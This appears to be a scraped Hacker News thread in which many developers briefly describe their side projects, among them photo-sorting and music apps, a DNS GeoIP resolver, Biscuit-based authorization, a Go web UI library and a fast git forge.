    &lt;p&gt;We're getting close! It's just a matter of polishing and polishing and polishing, but I'm really excited about how close we are to launch.&lt;/p&gt;
    &lt;p&gt;It is a desktop app built with Electron and React. I built to help newlywed couples to quickly sort thousands of wedding photos with a Tinder style swipe UI. It is offline first, fully private, and offers one click export of your selected pictures.&lt;/p&gt;
    &lt;p&gt;I started building it earlier this year after going through my own wedding photo experience and realizing how overwhelming it can be. I saw my wife dragging and dropping photos from one folder to other and thought there has to be a better way for non-photographer folks.&lt;/p&gt;
    &lt;p&gt;Right now, I have a working prototype, a landing page live, and I am testing distribution and feedback from early users.&lt;/p&gt;
    &lt;p&gt;Vibescape: an immersive meditation app. This one is currently featured at the top of the App Store, yay! Launched as a day one app on Vision Pro, new update has what I think is the best immersive environment I've made yet that comes alive with music: https://apps.apple.com/us/app/vibescape/id6476827678&lt;/p&gt;
    &lt;p&gt;I've been building https://resolver.one - a DNS server that returns GeoIP data as TXT records. Query an IP directly as the hostname (e.g. dig TXT 8.8.8.8.rslvr.one) and get back country, ASN, etc.&lt;/p&gt;
    &lt;p&gt;Always been fascinated by repurposing established protocols for unintended uses - DNS is everywhere, passes through firewalls, and has built-in caching. Seemed like a fun way to deliver location data without HTTP APIs.&lt;/p&gt;
    &lt;p&gt;Super niche, definitely a bit odd, but that's the appeal.&lt;/p&gt;
    &lt;p&gt;Data source is IPinfo Lite MMDB file, which seems to be offered freely without restrictions. I'd love to offer comprehensive GeoIP attributes but I'm afraid to even ask how much the DB download of that costs... I'm working on supporting new data sets now like security CVEs, shodan integration, etc.&lt;/p&gt;
    &lt;p&gt;I recently released JazzEar, an iOS app for ear training. Specifically focuses on improving recognition of chord progressions you would hear in jazz standards.&lt;/p&gt;
    &lt;p&gt;Now I'm working on a smaller app for jazz musicians to manage their tune list and act as a tool to help practice and review tunes. I wanted this app to tell me what tunes on my list I haven't played in a while (and might forget), or try different keys or exercises on the tune and track what I found difficult.&lt;/p&gt;
    &lt;p&gt;I'm pursuing my vision of "music-i18n": Open source music software that works for microtonal music and worldwide musical cultures.&lt;/p&gt;
    &lt;p&gt;It's not a from-scratch effort, quite the contrary: I'm trying to tie in existing music standards (MIDI, MusicXML, SMuFL, MEI, etc.) and ensure that FOSS systems (MuseScore, Verovio, smaller components) implement enough of those standards to support music-i18n.&lt;/p&gt;
    &lt;p&gt;Sometimes, this also includes extending the standards themselves when they are not fully capable of representing some non-mainstream musical aspect. For example, MusicXML lacks the ability of representing multiple accidentals per note (whereas MEI does), which is a must for microtonality.&lt;/p&gt;
    &lt;p&gt;I started down this path around 2018, as a music player who got interested in arranging Arabic songs in a "Real Book" style. It opened a giant rabbit hole that I'm still far from having fully explored.&lt;/p&gt;
    &lt;p&gt;Now and then, I collaborate with other devs who are interested in adjacent topics. I would love to hear from some of you here!&lt;/p&gt;
    &lt;p&gt;I'm working on a bunch of small tools for musicians. I want to simplify complex musical concepts by giving visual feedback and minimal UI. All modular components built with pure JavaScript.&lt;/p&gt;
    &lt;p&gt;I'm rebuilding OnlineOrNot's frontend to be powered by the public REST API. Doing this both as a means of dogfooding, and adding features to the REST API, that I easily dumped into the private GraphQL API without thinking too hard.&lt;/p&gt;
    &lt;p&gt;Basically I've realised GraphQL has taken me as far as it can, and I should've gone with REST to start with. That, and after I finish the first milestone (uptime checks + cron job monitors), I'll be able to start building a proper terraform provider, and audit logs.&lt;/p&gt;
    &lt;p&gt;It annoys me how much a bad trailer can spoil the movie, so I made this platform to rate trailers how "spoily" they are and how good they are. To my surprise, you find some great trailers without many spoilers, but then you will have trailers which are basically a 3-min summary of the movie.&lt;/p&gt;
    &lt;p&gt;Typing is an extremely underrated skill and especially in the age of LLMs, it is the bottle neck in a lot of cases.&lt;/p&gt;
    &lt;p&gt;I’ve never been fond of existing typing apps; excessive ads, typing random words, etc so I built my own.&lt;/p&gt;
    &lt;p&gt;You can practice typing code, use your own text, etc&lt;/p&gt;
    &lt;p&gt;We have a paid plan for features where you can type natural text that targets your weak points (via SmartPractice) and many others. Other than that, it’s both free to use (and ad-free)&lt;/p&gt;
    &lt;p&gt;I am building LookAway[1] - an antidote to seductive screens. Many people have been facing issues like eye strain, digital fatigue, CVS, posture issues, and more due to prolonged screen use and I aim to solve it with this product. I believe managing screen time is as important as managing sleep (if not more).&lt;/p&gt;
    &lt;p&gt;I'm working on Listening Facts[0], a music habits visualization tool based on your top tracks. Inspired by Receiptify and every day nutrition facts labels[1].&lt;/p&gt;
    &lt;p&gt;It started out as a Spotify oriented project but due to their recent API changes[2] I ended up focusing more on a Last FM integration. This wasn't that bad as their API provides more details such as play count per song. I've also added an Apple Music integration.&lt;/p&gt;
    &lt;p&gt;I posted about it[3] on Last FM's subreddit and I was pleasantly surprised to see that a lot of people shared their labels on the comments and seemed to like it.&lt;/p&gt;
    &lt;p&gt;I'm currently working on language detection, I think it'd be cool to get a language breakdown of the songs you listen to and for that to be part of the displayed items within the label. Something along the lines of EN- 80%, ES- 15%, FR - 5%&lt;/p&gt;
    &lt;p&gt;I've also tried getting Adsense on the website but I keep getting denied on "Low Content Value" grounds. I tried some alternatives but the quality of their ads was ridiculous (stuff like "your device has a virus, click here to clean it up")&lt;/p&gt;
    &lt;p&gt;My one man side project is Prisme Analytics: an high-perfomance, self-hosted and privacy-focused web analytics service.&lt;/p&gt;
    &lt;p&gt;I'm working on improving UX and simplifying deployment a lot. In the next release, a single docker run will be enough to get a working web analytics service with minimal resource usage.&lt;/p&gt;
    &lt;p&gt;Still working on cataloging a curated list of craft beer venues across the world at https://wheretodrink.beer&lt;/p&gt;
    &lt;p&gt;Unsure what the plan is going forward with it, apart from adding more venues and more countries. As long as it's fun for me I'll just keep adding things.&lt;/p&gt;
    &lt;p&gt;Next addition will be to add health inspection data from countries that have that in open datasets or APIs, so if anyone know of that I'd be appreciative of hints (know of UK, Norway and might have found for France).&lt;/p&gt;
    &lt;p&gt;Most of our jobs consist of working with tools. Yet it’s very hard to get insights into which tools are required most, are growing in your area, etc. So I decided to keep track of tools and technologies mentioned in the data space by keeping track of job openings for the last two years. Now I’ve opened up that data set. Here’s an analysis for jobs per data warehouse: https://selectfrom.work/insights/data_warehouses&lt;/p&gt;
    &lt;p&gt;Mostly organizing my dotfiles across Windows, macOS, Linux and BSD, however, I have really fallen for Ansible. I discovered at work awhile back, but was able to grok how to make and run a playbook, and I've been hooked since. It also finally allowed me to click the difference between Imperative and Declarative programming!&lt;/p&gt;
    &lt;p&gt;- Active recall studying app that allows a user to practice active recall[0]. The app hides user provided content at first and asking the user to try to remember all they can before reading the content. Then the user goes through the material slowly revealing each paragraph from their input. At the end they try to actively remember what they learned and can even compare to what they knew at the start.&lt;/p&gt;
    &lt;p&gt;- Mixtape sharing platform for midwest emo[1] which is a genre I've really gotten into over the past few years. The community is pretty strong on YouTube for creating "mixtapes" so I wanted a spot that was just for these videos.&lt;/p&gt;
    &lt;p&gt;- PhotoForge[2] Photographer's companion app which can help me choose photos using a Tinder-esque swiping mechanism. It also has some AI stuff for generating Instagram descriptions. Finally has a watermark tool. Still trying to think of other stuff to add. This was an AI code weekend project so it's like a house on stilts at the moment but I plan to give it some more love soon&lt;/p&gt;
    &lt;p&gt;We are working to build Notion, but for books. It is a personal book diary to collect your to-be-read and smart sort them, as well as log your reads and use that data to build a profile of your book dna in order to connect you with new books/authors that your book twins love.&lt;/p&gt;
    &lt;p&gt;I'm working on a partition-oriented declarative data build system. The inspiration comes from working with systems like Airflow and AWS step functions, where data orchestration is described explicitly, and the dependency relationships between input and produced data partitions is complex. Put simply, writing orchestration code for this case sucks - the goal of the project is to enable whole data platforms to be made up of jobs that declare their input and output partition deps, so that they can be automatically fulfilled, enabling kubernetes-like continuous reconciliation of desired partitions.&lt;/p&gt;
    &lt;p&gt;This means, instead of the answer to "how do we produce this output data" being "trigger and pray everything upstream is still working", we can answer with "the system was asked to produce this output data partition and its dependencies were automatically built for it". My hope is that this allows the interface with the system to instead be continuously telling it what partitions we want to exist, and letting it figure out the rest, instead of the byzantine DAGs that get built in airflow/etc.&lt;/p&gt;
    &lt;p&gt;This comes out of a big feeling that even more recent orchestrators like Prefect, Dagster, etc are still solving the wrong problem, and not internalizing the right complexity.&lt;/p&gt;
    &lt;p&gt;Very much agree that to this is the direction data orchestration platforms should go towards - the basic DAG creation can be straightforward, depending on how you do the authoring - (parsing SQL is always the wrong answer, but is tempting) - but backfills, code updates, etc are when it starts to get spicy.&lt;/p&gt;
    &lt;p&gt;I think this is where it gets interesting. With partition dependency propagation, backfills are just “hey this range of partitions should exist”. Or, your “wants” partitions are probably still active, and you can just taint the existing partitions. This invalidates the existing partitions, so the wants trigger builds again, and existing consumers don’t see the tainted partitions as live. I think things actually get a lot simpler when you stop trying to reason about those data relationships manually!&lt;/p&gt;
    &lt;p&gt;Https://KushtyBuckRecords.com Been thinking a lot about tools for modern musicians/artists/producers. Not tools for creating the music but tools for communication. Email subscriber lists, event creation (image and text) combined with ability to generate QR codes and send them with easy to use dashboard, some kind of insights into the QR scans, merchandise (integrations with Shopify), hn style link aggregation around music.. been building it with my son who also becomes my product manager since he the one using the tools. For now a private repo consisting of a rails API and a react TS frontend app. Everyday I come up with some small improvements in my head but alas not enough time in the world. With the day job an all, this is purely a passion project and a way to help my son follow his passion, putting on house music events and DJ/producing. If anyone interested, plz reach out contact@kushtybuckrecords.com&lt;/p&gt;
    &lt;p&gt;I'm trying to incentivize people to build IRL communities instead of AI-related apps because the demand for human interaction FAR outweighs the supply. My platform (https://onthe.town), is basically Shopify for social experience clubs. Anyone can start a club and create events based around bringing random people together IRL based on shared interests. You get your own website and infra that handles signups, payments, and matching.&lt;/p&gt;
    &lt;p&gt;It's largely based on platform-izing the extremely popular Timeleft app that simply matches 6 random people for dinner. With onthe.town, anyone can create a Timeleft-like app around any concept they're interested in. Some clubs people have created include a golf club (get matched with 3 other people to play golf with), a vinyl record sharing club, a lunch club for biotech networking, and a club to meet other parents for dinner.&lt;/p&gt;
    &lt;p&gt;There was a startup in my region who got popular with the simple idea of having a website/service that manages simple events, like talks, presentations etc.&lt;/p&gt;
    &lt;p&gt;I think it started with mostly students using it because there used to be a lot of university-related events like these, and eventually they’ve become the standard platform for that, at least in the State. It was all pretty simple, it managed payment etc. and you’d get a QR code by email or in the app that could be scanned in the entrance.&lt;/p&gt;
    &lt;p&gt;I’ve been working on a few utility libraries to make it easier to develop web services, basically exporting packages that I find myself using or rewriting often and exporting them as their own modules.&lt;/p&gt;
    &lt;p&gt;I’m working on https://github.com/hxtk/aip as a collection of libraries giving safe default choices to implement Google’s API improvement proposals in ConnectRPC services. It borrows (with attribution per the license) an unexported implementation of AUP-160 filters from the LuCI project, and I intend to expand it to support data sources other than SQL databases and page tokens, and it also exports an implementation of AIP-161 field masks (which have different semantics compared to standard field masks) and middleware to help with using them for AIP-157 read filtering. I intend to export more middleware that I use frequently, but I don’t know if it’ll live in this module or its own yet.&lt;/p&gt;
    &lt;p&gt;Clicking items in the tensors explains where they came from and where they are used in the output. The input tensors can be modified too.&lt;/p&gt;
    &lt;p&gt;It's a one-man side project that's been half building the site framework, and half re-implementing pytorch functions in javascript. Plenty more functions to go, but hopefully people can already find it useful. I'm planning on doing a Show HN once I've added ~10 more functions.&lt;/p&gt;
    &lt;p&gt;Posting this from a throwaway account because my main account is locked due to `noprocrast`!&lt;/p&gt;
    &lt;p&gt;You just upload a picture and pick a design type and it generates a thumbnail for you. Got good feedback last time I posted, steadily and slowly growing now.&lt;/p&gt;
    &lt;p&gt;I'm trying to build a next gen quickbooks competitor.&lt;/p&gt;
    &lt;p&gt;Something that doesn't nickle and dime you, very cheap (perhaps even open source), has all of the extensibility of a modern ERP, a great UI, and handles complex use cases (revenue rec, expense management, inventory cogs, etc).&lt;/p&gt;
    &lt;p&gt;I feel like this is solving a real problem, but have no idea how to break into the industry. Just trying to solve my own problems for business accounting but would be nice to know other folks would be interested.&lt;/p&gt;
    &lt;p&gt;I have made a Bürgeramt appointment finder. It was down for a few weeks after the city of Berlin changed its anti-bot measures. I just released an updated version that works again: https://allaboutberlin.com/tools/appointment-finder&lt;/p&gt;
    &lt;p&gt;My citizenship wait times page (https://allaboutberlin.com/guides/citizenship-wait-times) has also gotten enough feedback to be useful since its release last month. I'd like to make it more useful with better visualisations.&lt;/p&gt;
    &lt;p&gt;Now I'm working on another iteration of my health insurance calculator (https://allaboutberlin.com/tools/health-insurance-calculator). It's kind of a big deal both because it's a huge financial decision for recent immigrants, and because it funds a big chunk of all the free stuff I'm putting out. This is especially important with ChatGPT and AI summaries halving my traffic. This iteration will recommend health insurance combinations that work for a visa application and for a long-term stay in Germany. It will provide far better explanations.&lt;/p&gt;
    &lt;p&gt;At the same time, I'm testing a new insurance broker with far shorter response times, so people can directly ask an expert to help them choose. They're reachable via Whatsapp, and that made a huge difference in how people get advice. It worked so well that I want to do the same for other topics. I'm already talking with an immigration lawyer who's interested.&lt;/p&gt;
    &lt;p&gt;An open-source protein/molecule viewer, molecular dynamics sim, and general structural biology toolkit, written in Rust. And an ecosystem of libraries to back it up.&lt;/p&gt;
    &lt;p&gt;Focusing on ergonomics improvements. Just released an improvement to the __repr__ for Invalid types.&lt;/p&gt;
    &lt;p&gt;Potentially working on expanding the ability to generate validators from arbitrary typehints, ie `get_typehint_validator(list[str | int])`. It has good coverage, but I suspect I'm blind to some obvious holes. Would love feedback!&lt;/p&gt;
    &lt;p&gt;It's not the core of koda-validate, and yeah lots of libraries have a similar capacity. Feedback I'd be interested in is if there are gaps.&lt;/p&gt;
    &lt;p&gt;In general the value prop of koda-validate is that it turns validation into typesafe building blocks, which makes validators very re-usable -- and flexible. Some other notable differences from pydantic are that it doesn't `raise` on validation errors, you don't need a typing plugin, and it's fully asyncio-compatible.&lt;/p&gt;
    &lt;p&gt;I'm actually in the middle of a complete redesign of the AI layer, but there is a POC video linked from the GitHub README that demonstrates the interaction I'm going for using an earlier version. The POS is a very bare-bones system where the "kernel," as it were, is implemented in Rust. There's an MCP atop that to allow the AI and UI layers to drive the POS. Stores may be implemented as extensions that plug into the POS kernel, and that's where language, currency, item databases, and such are defined. The AI cashier knows what items are for sale, how to modify items (in a restaurant context), how to translate from other languages, how to interpret what the customer actually wants, and seamlessly lead the customer through a transaction.&lt;/p&gt;
    &lt;p&gt;The current code is quite ugly and full of a lot of unfortunate hacks, but it was a good education. The new design puts the AI much more in charge, without as much code-level orchestration. I'm applying a lot of my knowledge from the retail POS and self-service checkout domains to this, as well as learning a lot about applying AI to a "legacy" software domain.&lt;/p&gt;
    &lt;p&gt;I might be taking a contracted job to help provide AI/ML guidance for a friend's company here soon, but all I really do is use ChatGPT/Claude Code a lot and don't really have explicit AI/ML tool building experience. They know this and mostly just want me for competency and comfort going from 0-1 with a new project, but I'm still pretty nervous! So I'm trying to conjure up some simple ideas to inspire me to learn :)&lt;/p&gt;
    &lt;p&gt;Currently trying to predict student absenteeism in the future based on historical indicators with synthetic data using basic ML modeling and then using LLMs to generate helpful guidance for relevant parties. Basically letting parents know there's concern and citing leading indicators.&lt;/p&gt;
    &lt;p&gt;Not sure what I'll do next, but hoping to come up with a few other ideas to put my mind at ease. It's fun having some actual motivation to keep up with the current hype instead of just being a consumer, though!&lt;/p&gt;
    &lt;p&gt;I’m currently hacking away at a project which turns your keyboard into a clipboard manager, password vault and barcode reader as parts of it. I just need to come up with a better name than totally normal keyboard (:&lt;/p&gt;
    &lt;p&gt;Just an old hobbyist these days. I'm finishing up the written manual portion of a "breadboard helper" for playing with (learning) electronics. The current "helper" I am finishing up gives you instructions (and an explanation) for wiring up over a dozen transistor logic circuits with the aid of a small PCB + breadboard [1].&lt;/p&gt;
    &lt;p&gt;Inspired by Forrest Mims III, Don Lancaster and the "75 in 1" style electronic project kits my mom got for me for Christmas when I was a kid.&lt;/p&gt;
    &lt;p&gt;I hope to sell them and then probably never recoup my investment.&lt;/p&gt;
    &lt;p&gt;There was "choker" back in the day, which I actually never heard about since I wasn't into chess back then. But (1) there was no web version, and (2) it had a specific gameplay that seems too slow for my taste. My version is highly customizable on the setup/rounds/rules, too. From my research, the original was also overrun by bots.&lt;/p&gt;
    &lt;p&gt;Looking up choker online I found this reddit thread:&lt;/p&gt;
    &lt;p&gt;&amp;gt; It’s a cool concept, but terrible app design and it’s all just bots you connect with, making it terribly easy to win almost every game&lt;/p&gt;
    &lt;p&gt;It sounds like this game needs a better AI opponent then? I don’t know anything about this game but something that learned from your gameplay and figured out how to beat you would be very cool.&lt;/p&gt;
    &lt;p&gt;I already have a better chess engine at different skill levels for 1-player mode. For two human players, I plan to start with sending a link to a friend given there won't be enough random players on the website to find one in real-time.&lt;/p&gt;
    &lt;p&gt;I'm working on Vedro, a Python testing framework as a pytest alternative without the magic and with clear output.&lt;/p&gt;
    &lt;p&gt;The main idea is that tests should just be Python: plain `assert` statements instead of custom matchers, no fixture magic, and when tests fail you get readable diffs that actually show what went wrong. Tests can be simple functions or structured with steps that self-document in the output.&lt;/p&gt;
    &lt;p&gt;Testing jig for a traction control system for a locomotive. Microcontroller connected to a DDS waveform generator simulates the sensor that picks wheel speed, various ADCs and DACs read in analog voltages that are compared to determine loss of traction. 1980s analog computing at its finest. If I had a choice I would be doing anything else ;)&lt;/p&gt;
    &lt;p&gt;I am launching (tomorrow) a service that helps builders and businesses fix their vibe coded apps and get them production-ready and integrated into their organization:&lt;/p&gt;
    &lt;p&gt;https://finbodhi.com — It helps you track, understand, and plan your personal finances — with a proper accounting foundation.&lt;/p&gt;
    &lt;p&gt;It's a double-entry personal finance tool where you own your data. It’s local-first, syncs across devices, and everything’s encrypted in transit. Soon with multi-currency support. Currently targeted for desktops.&lt;/p&gt;
    &lt;p&gt;It's interesting in many way. Using double-entry (it's a perspective shift and a power tool), the challenges and advantages of building local-first app, UI/UX &amp;amp; visualizations, privacy and more. For personal apps, local-first is a good fit.&lt;/p&gt;
    &lt;p&gt;I made my pops a walnut multi-guitar stand a couple months ago and I’d like to get some nice pics done and make one of those eCommerce web site things to sell them. Here's a bad pic https://bradlyfeeley.com/onokura.jpg&lt;/p&gt;
    &lt;p&gt;I'm toying around with a language that's like Python but with Hindley-Miller interference and some functional stuff. It's not a superset or anything, because I can't do that, but it's interesting how well HM (plus some well-encapsulated escape hatches) map onto the Python ecosystem with all its dynamism.&lt;/p&gt;
    &lt;p&gt;I’m working on https://www.hessra.net/, an identity + authorization service built around [Biscuits](https://www.biscuitsec.org/) instead of JWTs. The goal is to decompose auth primitives so they’re easier to use in service-to-service cases, while also showing off what Biscuit tokens make possible.&lt;/p&gt;
    &lt;p&gt;JWTs feel like problems waiting to happen. I think biscuits give stronger guarantees and are harder to get wrong.&lt;/p&gt;
    &lt;p&gt;One piece I’ve shipped is an identity token that can be delegated offline. For example, “company:alice” can delegate to “company:alice:agent,” and that token can then be used to request an authorization token. This makes for a neat API key model: you can issue a simple opaque identity token to your customer (e.g. “customer123”) without having to maintain a DB of hashes/expirations, since those are encoded into the token. Later, you can upgrade security by exchanging the identity token for an authorization token, or let customers delegate access (e.g. “customer123:marketing”).&lt;/p&gt;
    &lt;p&gt;I’ve also been experimenting with higher-order authorization flows:&lt;/p&gt;
    &lt;p&gt;• Service chains: each step in a request’s path (edge → app → DB) can add attestations, so later services can validate the full chain.&lt;/p&gt;
    &lt;p&gt;• Multi-party authorization: requiring two independent services/orgs to co-sign an authorization token, useful for cross-org or on-prem deployments.&lt;/p&gt;
    &lt;p&gt;Right now I’m building an OAuth 2.1 profile where the identity token replaces a refresh token and the authorization token stands in for the access token. I’m especially interested in hearing where people find OAuth clunky in practice, or stories from folks who’ve built auth systems with other token types (macaroons, biscuits, etc.) or for use cases where OAuth didn’t fit well.&lt;/p&gt;
    &lt;p&gt;Biscuits are in the same family as macaroons in that they are bearer tokens that can be attenuated offline, but they go further. A biscuit carries a chain of signed “blocks” that can contain facts, rules, and checks in a small Datalog-like logic language. That lets the token itself express richer authorization context, not just restrictions.&lt;/p&gt;
    &lt;p&gt;Key differences from macaroons:&lt;/p&gt;
    &lt;p&gt;- Crypto model: Macaroons use HMAC, so every verifier needs the shared secret. Biscuits use public/private keypairs so any verifier with the public key can check validity.&lt;/p&gt;
    &lt;p&gt;- Expressiveness: Macaroons only add caveats (restrictions). Biscuits can encode facts, rules, and checks, enabling more complex policies to travel with the token. so you can attest and attenuate (and do some other tricky stuff if you want)&lt;/p&gt;
    &lt;p&gt;- Delegation: Both support attenuation, but biscuits do it with signed blocks that are verifiable and can be chained across services.&lt;/p&gt;
    &lt;p&gt;So conceptually similar, but biscuits aim to be more decentralized and policy-rich.&lt;/p&gt;
    &lt;p&gt;I've been working on a tool called Materia[0] for managing Podman Quadlets on hosts, GitOps style and I think it's really starting to hit its stride. I just released a new version yesterday: https://github.com/stryan/materia/releases/tag/v0.3.0 .&lt;/p&gt;
    &lt;p&gt;There's been a couple attempts in this space before but they usually seem to peter out after a while. I'm hoping to avoid that by staying flexible and focusing on just managing files instead of creating a new compose-like DSL. But even if it doesn't become popular I'm just happy I don't have to manage my homelab with Ansible anymore :) .&lt;/p&gt;
    &lt;p&gt;I’m solo-coding the clear commercial project smmdealfinder.com which is not ground-breaking or amazing as these other great projects here, but its been an amazing journey for me personally for the last 18 months and has developed me probably from a junior engineer to senior+/staff.&lt;/p&gt;
    &lt;p&gt;Whilst I’m recently really critical of most AI posts here, this wouldn’t have been possible without AI, but mainly because AI could feed my curiosity and barely any riddle was unsolvable, when I put it into pieces and combined it with debugging (and checking docs). Actually most riddles on my level weren’t unsolvable before, but AI reduced the friction and speed of learning for me. This actually goes beyond coding. In life I just ask and learn a lot about, washing, cooking and domain-specific terms.&lt;/p&gt;
    &lt;p&gt;Also working on DailySelfTrack ( https://dailyselftrack.com/ ), an app to track what matters to you in a way that you find relevant. So it is a mix of habit tracker, health log and journal. Like a spreadhsheet app, but with much better UX. And like a habit/health app, but with much greater customization.&lt;/p&gt;
    &lt;p&gt;I want this to be a tool highly useful for people who have complex health issues, are working towards ambitious goals, or just want to regularly reflect on their day.&lt;/p&gt;
    &lt;p&gt;I'm building it since I couldn't find a satisfying solution anywhere. It's local first and does not force you into a subscription, or tries to exploit you with any other dark patterns&lt;/p&gt;
    &lt;p&gt;Yesterday I proved the infinitude of primes, which I was pretty happy with. https://www.philipzucker.com/knuckle_primes/ A trivial theorem in the scheme of things, but one for which z3 certainly can't do it on it's own.&lt;/p&gt;
    &lt;p&gt;Inspired by a friend getting a random email and it sparking a memory for me: https://pageday.org, a global message lottery where each day a random message is drawn to be the homepage.&lt;/p&gt;
    &lt;p&gt;Yeah that's a good question, and something we haven't codified.&lt;/p&gt;
    &lt;p&gt;Odds are that we'll curate quite heavily to keep it interesting and maybe along similar guidelines to hn with "anything that gratifies one's intellectual curiosity" rather than just "anything".&lt;/p&gt;
    &lt;p&gt;I'm working on exploring an exploit in physical security systems that I haven't seen anyone investigate before (at least, not published on the internet). It's involved an interesting combination of reverse engineering, pentesting and regular prototyping/hardware development.&lt;/p&gt;
    &lt;p&gt;Currently writing a run-through of it to publish on my website. I'm not sure how secretive to be - I think I just want to be the first to actually release my findings. In my post I'll detail the steps to reproduce my results so more people can look into this.&lt;/p&gt;
    &lt;p&gt;So far I haven't found any critical ways to (ab)use this access control system weakness, as it only typically applies to the outer layer of physical security.&lt;/p&gt;
    &lt;p&gt;On the side, I‘m building a platform that allows to run MCP servers on demand, making them reachable under a public URL, but password-protected. You also get an embedded VNC viewer, and thus you can watch what an AI-agent is doing with it.&lt;/p&gt;
    &lt;p&gt;This makes it possible to use your own, dedicated MCP server instances from, for example, n8n workflows, without thinking about infrastructure.&lt;/p&gt;
    &lt;p&gt;I am working on my Go UI library called gooey [1] which aims to be a one stop framework to build webview/webview apps in Go and WebASM.&lt;/p&gt;
    &lt;p&gt;It started out with bindings for the DOM, Web, and Browser APIs, but as of today I now have custom Web Components support (which is a big deal considering Go's type system quirks).&lt;/p&gt;
    &lt;p&gt;Tomorrow I'm gonna polish some of the UI components and start refactoring my git-evac [2] repo management tool which is the first app using the gooey framework.&lt;/p&gt;
    &lt;p&gt;&amp;gt; Components are bad for web accessibility (aria- property fatigue).&lt;/p&gt;
    &lt;p&gt;I've been using web components as a vehicle to automate and auto validate accessibility aspects as much as possible, because I think the only way to truly make things sustainably accessible is to find a way to unburden the developer by either inferring as much as possible or making validation a natural part of development rather than a separate testing cycle that will invariably cause accessibility support to become out of sync.&lt;/p&gt;
    &lt;p&gt;It sounds like you might have similar concerns. Do you have any insights to share along these lines for Gooey?&lt;/p&gt;
    &lt;p&gt;The UI components that I wrote initially are just wrappers for the Browser provided input/form elements. As I'm relying on webview/webview to build desktop apps out of it, that also kind of implies WebKitGTK4 on Linux, WebKit on MacOS, and WebView2 (Edge) on Windows.&lt;/p&gt;
    &lt;p&gt;These work quite nicely together with a screen reader because you don't have to intercept the focus event (or others) that people browsing in caret mode or similar would use to navigate the page.&lt;/p&gt;
    &lt;p&gt;Additionally I decided to make single page applications using a main and section[data-view] elements so that the HTML and CSS alone is enough to hint screen readers on what's visible and so that there are no javascript codes necessary to tween things around, the JS/WebASM side of things literally just sets a data-view property on the main element.&lt;/p&gt;
    &lt;p&gt;The whole idea behind gooey and the way it is structured is:&lt;/p&gt;
    &lt;p&gt;- all states must be serializable in HTML&lt;/p&gt;
    &lt;p&gt;- Static HTML and CSS makes the page usable (apart from web forms and REST APIs, that's developer provided code)&lt;/p&gt;
    &lt;p&gt;- Dynamic WebASM on top essentially translates the DOM to be interactive, so that things can be animated based on changing data or streams coming from the backend. All interactivity is rendered directly into the DOM, so that it can be serialized again at all times.&lt;/p&gt;
    &lt;p&gt;- Communication between Client and Server is JSON or any other Go implemented Marshaller, and using Fetch API behind the scenes.&lt;/p&gt;
    &lt;p&gt;I decided on purpose to not provide XMLHTTPRequest and other old APIs because I'm relying on WebASM and "modern Browser engines" anyways. This way I kinda force users of gooey to use modern JS from the WebASM context and I save a whole lot of trouble with compatibility issues (and don't get into the unsemantic div fatigue like React does, for example).&lt;/p&gt;
    &lt;p&gt;The bindings should also work with tinygo's compiler if you're careful with deadlocks (see docs/ERRATA.md).&lt;/p&gt;
    &lt;p&gt;Haven't tested the typecasting that's required for the components yet though, they might break because of some generics quirks (e.g. Wrap/Unwrap helper methods).&lt;/p&gt;
    &lt;p&gt;I have been working on my terminal editor, but I parked that for now -- https://github.com/bloomca/love. It is possible to load a file and edit it, copy/paste works, you can select text, etc. The next step is to integrate with the tree-sitter for syntax highlighting and then with LSP, but it took a bit more time than I wanted.&lt;/p&gt;
    &lt;p&gt;Another project of mine is to play music from my audio CDs by myself. I built a simple Rust library to read TOC and raw PCM data from a CD drive -- https://github.com/Bloomca/rust-cd-da-reader (works on Windows, macOS and Linux), and a ripper -- https://github.com/Bloomca/audio-cd-ripper, which rips all tracks and encodes it as FLAC and fetches metadata from MusicBrainz.&lt;/p&gt;
    &lt;p&gt;The next step is to play it. I looked into using cpal (https://github.com/RustAudio/cpal), but I feel like using low-level audio API for each platform is a better approach for learning.&lt;/p&gt;
    &lt;p&gt;Oar, a GitOps Continuous Delivery tool for Docker Compose. Think ArgoCD, but you don't need or want all that Kubernetes complexity. https://github.com/oar-cd/oar&lt;/p&gt;
    &lt;p&gt;I'm working on a Heroku / Render / Flyio alternative thats free, open source, built on top of Kubernetes for about 2 years now.&lt;/p&gt;
    &lt;p&gt;I’ve found these services charge way too much per GB of memory (10x more than IaaS providers), but more importantly, offer terrible flexibility. You can’t schedule multiple apps on the same instance, and there aren’t many instance size options.&lt;/p&gt;
    &lt;p&gt;Canine also supports deployments of any helm package (postgres, airbyte, dagster, etc) via helm charts.&lt;/p&gt;
    &lt;p&gt;I've been working on raytraced lighting in the Bevy game engine, using wgpu's new support for hardware raytracing in WGSL. The initial prototype is launching with the release of Bevy 0.17 tomorrow, but there's still a ton left to improve. Lots of experimenting with shaders and different optimizations.&lt;/p&gt;
    &lt;p&gt;I'm working on a new type of git forge[1], optimized for speed and work with patches.&lt;/p&gt;
    &lt;p&gt;It goes to extreme lengths to ensure great performance, i.e. rewritten most server-side parts of git from scratch, so there is no "exec"-ing git nor calls to libraries like libgit2. The frontend should also be very fast thanks for HTMX.&lt;/p&gt;
    &lt;p&gt;It's a digital comic book store. Letterboxd with a buy button. It's really fun. We've got a lot of great publishers signed, and a great team. It's such a thrill to work in a space where people work their ass off to create art, in spite of the fact that the rewards are minimal. Our job, we feel, is to make them more money to make more art.&lt;/p&gt;
    &lt;p&gt;Often, when I use generative AI to produce videos, the results are close to what I envision but rarely capture my imagination exactly. Prompting the AI to fix specific details can be a cumbersome and time-consuming process. To address this, I'm developing solutions that make the creative workflow more intuitive. So far, I’ve built an app that allows users to provide visual clues as guides, along with a 3D environment where the camera can be freely manipulated within the generated scene.&lt;/p&gt;
    &lt;p&gt;The community is moving fast though. Now higgsfield allows using arrows and pointers to edit the video but so far, no one is doing a good camera control visually.&lt;/p&gt;
    &lt;p&gt;Spanara - A word game inspired by the "license plate game" my wife taught me while we lived in Finland. License plates in Finland always start with 3 letters, so out on our walks we'd try to come up with a word quickly, and got more kudos for "good" words. This was a first attempt at a personal project using AI.&lt;/p&gt;
    &lt;p&gt;I am currently working on a new mode that is more like what played walking around: a few rounds in rapid fire, very little time to think before the next round.&lt;/p&gt;
    &lt;p&gt;I’m writing a Python framework to create Python home automation scripts driving Zigbee2MQTT with as little boilerplate as possible. https://pyziggy.github.io&lt;/p&gt;
    &lt;p&gt;It supports Claude Code and Codex, but has you constantly working on multiple features in Git worktrees. This way you are always able to stay busy while waiting on your agents.&lt;/p&gt;
    &lt;p&gt;It has built in tools for review, such as a diff viewer, and a quick button to run your application in different worktrees for testing. It has completely transformed the way I work.&lt;/p&gt;
